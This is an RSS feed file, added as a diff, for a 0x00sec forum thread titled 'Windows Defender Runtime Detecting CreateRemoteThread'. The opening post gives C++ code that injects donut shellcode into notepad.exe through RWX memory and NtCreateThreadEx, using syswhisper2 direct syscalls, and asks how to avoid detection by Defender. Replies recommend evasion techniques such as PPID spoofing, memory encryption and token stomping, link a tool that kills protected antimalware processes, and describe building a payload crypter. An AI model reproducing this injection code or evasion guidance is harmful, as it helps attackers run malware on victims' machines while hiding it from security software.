@@ -1,0 +1,115 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Windows Defender Runtime Detecting CreateRemoteThread</title>
+    <link>https://0x00sec.org/t/windows-defender-runtime-detecting-createremotethread/28786</link>
+    <description>CreateRemoteThread with donut shellcode I get detected after 10seconds.
+
+I use syswhisper2, this is the main piece of code:
+
+```cpp
+DWORD pid = utils::find_pid(XorStr(L&quot;notepad.exe&quot;));
+	if (pid != 0)
+	{
+		processHandle = LI_FN(OpenProcess).in(LI_MODULE(&quot;kernel32.dll&quot;).get())(PROCESS_ALL_ACCESS, FALSE, pid);
+		NtAllocateVirtualMemory(processHandle, &amp;remoteBuffer, 0, &amp;payloadLen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		NtWriteVirtualMemory(processHandle, remoteBuffer, execMem, payloadLen, NULL);
+		//XOR((char*)execMem, payloadLen, payloadKey, payloadKeyLength);
+		NtCreateThreadEx(&amp;remoteThread, GENERIC_EXECUTE, NULL, processHandle, (LPTHREAD_START_ROUTINE)remoteBuffer, nullptr, FALSE, 0, 0, 0, nullptr);
+		CloseHandle(processHandle);
+
+		Sleep(500);
+
+		//DWORD oldProt = 0;
+		//LI_FN(VirtualProtectEx).in(LI_MODULE(&quot;kernel32.dll&quot;).get())(processHandle, remoteBuffer, payloadLen, PAGE_EXECUTE_READ, &amp;oldProt);
+	}
+```
+
+Other AVs are easy to bypass since they are usermode. I think defender is monitoring the kernel calls itself if I&#39;m not mistaken.
+
+Im calling using jmp inside syswhisper&#39;s stub and redirecting to .text of ntdll
+
+https://github.com/FSecureLABS/Ninjasploit is a method but it will work only for CreateProcess
+
+Thanks in advance</description>
+    
+    <lastBuildDate>Fri, 01 Apr 2022 11:29:48 +0000</lastBuildDate>
+    <category>Malware</category>
+    <atom:link href="https://0x00sec.org/t/windows-defender-runtime-detecting-createremotethread/28786.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Windows Defender Runtime Detecting CreateRemoteThread</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/windows-defender-runtime-detecting-createremotethread/28786/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/windows-defender-runtime-detecting-createremotethread/28786/4</link>
+        <pubDate>Thu, 28 Jul 2022 05:11:41 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-28786-4</guid>
+        <source url="https://0x00sec.org/t/windows-defender-runtime-detecting-createremotethread/28786.rss">Windows Defender Runtime Detecting CreateRemoteThread</source>
+      </item>
+      <item>
+        <title>Windows Defender Runtime Detecting CreateRemoteThread</title>
+        <dc:creator><![CDATA[c0z]]></dc:creator>
+        <description><![CDATA[
+            <p>Also it seems that AV/EDR’s love detecting remote process injection, so injecting into yourself and doing PPID spoofing, heap encyrption, in-memory encryption (VEH single-stepping or alternating memory permissions) would most likely avoid Windows defender. Also it’s worth mentioning that it’s not just Windows Defender that you would be thinking about but ETW and the KeDispatchTable are both vested interests, maybe even doing Token Stoming would benefit you here.</p>
+<p>Here’s a recent project using ProcExp driver to effectively disable the PROTECTION_LEVEL_ANTIMALWARE_LIGHT (RtlSetCriticalProcess) set on most AV/EDR products <a href="https://github.com/Yaxser/Backstab" class="inline-onebox" rel="noopener nofollow ugc">GitHub - Yaxser/Backstab: A tool to kill antimalware protected processes</a><br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/1/6169a30d30efe050fc68cb460836011938eb95bf.png" data-download-href="/uploads/short-url/dTKDIOAjcOJxwhfDvZhHtiJNjDV.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/1/6169a30d30efe050fc68cb460836011938eb95bf.png" alt="image" data-base62-sha1="dTKDIOAjcOJxwhfDvZhHtiJNjDV" width="690" height="264" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/6/1/6169a30d30efe050fc68cb460836011938eb95bf_2_10x10.png"></a></div><br>
+<div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/3/2/32d25eccafb24b64a090e37ed7ea805a7e80bdb5.png" data-download-href="/uploads/short-url/7fAAzk61EdIYnDfmIkSEj7vCtnf.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/3/2/32d25eccafb24b64a090e37ed7ea805a7e80bdb5_2_690x246.png" alt="image" data-base62-sha1="7fAAzk61EdIYnDfmIkSEj7vCtnf" width="690" height="246" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/3/2/32d25eccafb24b64a090e37ed7ea805a7e80bdb5_2_690x246.png, https://0x00sec.s3.amazonaws.com/optimized/3X/3/2/32d25eccafb24b64a090e37ed7ea805a7e80bdb5_2_1035x369.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/3/2/32d25eccafb24b64a090e37ed7ea805a7e80bdb5.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/3/2/32d25eccafb24b64a090e37ed7ea805a7e80bdb5_2_10x10.png"></a></div><br>
+<div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/3/1/318be87d85d875c6f5c151cd94bfe2dc66c6bb77.png" data-download-href="/uploads/short-url/74j9azZDmjgTYwR41MU1INBMlcb.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/3/1/318be87d85d875c6f5c151cd94bfe2dc66c6bb77_2_690x376.png" alt="image" data-base62-sha1="74j9azZDmjgTYwR41MU1INBMlcb" width="690" height="376" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/3/1/318be87d85d875c6f5c151cd94bfe2dc66c6bb77_2_690x376.png, https://0x00sec.s3.amazonaws.com/original/3X/3/1/318be87d85d875c6f5c151cd94bfe2dc66c6bb77.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/3/1/318be87d85d875c6f5c151cd94bfe2dc66c6bb77.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/3/1/318be87d85d875c6f5c151cd94bfe2dc66c6bb77_2_10x10.png"></a></div><p></p>
+<p>You really need to understand what is being caught and how, because if you don’t the possibilities are almost endless. You can try to apply all the different types of evasion techniques but in reality you really only need a couple that evade what is being <em>detected</em>. The catch is that you have to <em>find it</em>.</p>
+          <p><a href="https://0x00sec.org/t/windows-defender-runtime-detecting-createremotethread/28786/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/windows-defender-runtime-detecting-createremotethread/28786/3</link>
+        <pubDate>Fri, 01 Apr 2022 11:29:48 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-28786-3</guid>
+        <source url="https://0x00sec.org/t/windows-defender-runtime-detecting-createremotethread/28786.rss">Windows Defender Runtime Detecting CreateRemoteThread</source>
+      </item>
+      <item>
+        <title>Windows Defender Runtime Detecting CreateRemoteThread</title>
+        <dc:creator><![CDATA[C_J]]></dc:creator>
+        <description><![CDATA[
+            <p>Encrypting your payload and decrypting it upon execution is one of the most well-documented and simple strategies to avoid static analysis. Static file signatures are rendered worthless since each time a new payload is created. Multiple open source projects (Veil, Hyperion, PE-Crypter, and so on) illustrate this, but we also wanted to test memory injection techniques, so we created a bespoke crypter to include them in the same payload.</p>
+<p>Our payload and the malicious payload would be decrypted, loaded, and executed by the crypter via a “stub.” By passing these through our crypter, we’ll be able to combine them into a final payload that we can send to our target.</p>
+          <p><a href="https://0x00sec.org/t/windows-defender-runtime-detecting-createremotethread/28786/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/windows-defender-runtime-detecting-createremotethread/28786/2</link>
+        <pubDate>Wed, 30 Mar 2022 11:53:47 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-28786-2</guid>
+        <source url="https://0x00sec.org/t/windows-defender-runtime-detecting-createremotethread/28786.rss">Windows Defender Runtime Detecting CreateRemoteThread</source>
+      </item>
+      <item>
+        <title>Windows Defender Runtime Detecting CreateRemoteThread</title>
+        <dc:creator><![CDATA[Werew1942]]></dc:creator>
+        <description><![CDATA[
+            <p>CreateRemoteThread with donut shellcode I get detected after 10seconds.</p>
+<p>I use syswhisper2, this is the main piece of code:</p>
+<pre><code class="lang-cpp">DWORD pid = utils::find_pid(XorStr(L"notepad.exe"));
+	if (pid != 0)
+	{
+		processHandle = LI_FN(OpenProcess).in(LI_MODULE("kernel32.dll").get())(PROCESS_ALL_ACCESS, FALSE, pid);
+		NtAllocateVirtualMemory(processHandle, &amp;remoteBuffer, 0, &amp;payloadLen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		NtWriteVirtualMemory(processHandle, remoteBuffer, execMem, payloadLen, NULL);
+		//XOR((char*)execMem, payloadLen, payloadKey, payloadKeyLength);
+		NtCreateThreadEx(&amp;remoteThread, GENERIC_EXECUTE, NULL, processHandle, (LPTHREAD_START_ROUTINE)remoteBuffer, nullptr, FALSE, 0, 0, 0, nullptr);
+		CloseHandle(processHandle);
+
+		Sleep(500);
+
+		//DWORD oldProt = 0;
+		//LI_FN(VirtualProtectEx).in(LI_MODULE("kernel32.dll").get())(processHandle, remoteBuffer, payloadLen, PAGE_EXECUTE_READ, &amp;oldProt);
+	}
+</code></pre>
+<p>Other AVs are easy to bypass since they are usermode. I think defender is monitoring the kernel calls itself if I’m not mistaken.</p>
+<p>Im calling using jmp inside syswhisper’s stub and redirecting to .text of ntdll</p>
+<p><a href="https://github.com/FSecureLABS/Ninjasploit" class="inline-onebox" rel="noopener nofollow ugc">GitHub - FSecureLABS/Ninjasploit: A meterpreter extension for applying hooks to avoid windows defender memory scans</a> is a method but it will work only for CreateProcess</p>
+<p>Thanks in advance</p>
+          <p><a href="https://0x00sec.org/t/windows-defender-runtime-detecting-createremotethread/28786/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/windows-defender-runtime-detecting-createremotethread/28786/1</link>
+        <pubDate>Mon, 28 Mar 2022 13:10:54 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-28786-1</guid>
+        <source url="https://0x00sec.org/t/windows-defender-runtime-detecting-createremotethread/28786.rss">Windows Defender Runtime Detecting CreateRemoteThread</source>
+      </item>
+  </channel>
+</rss>
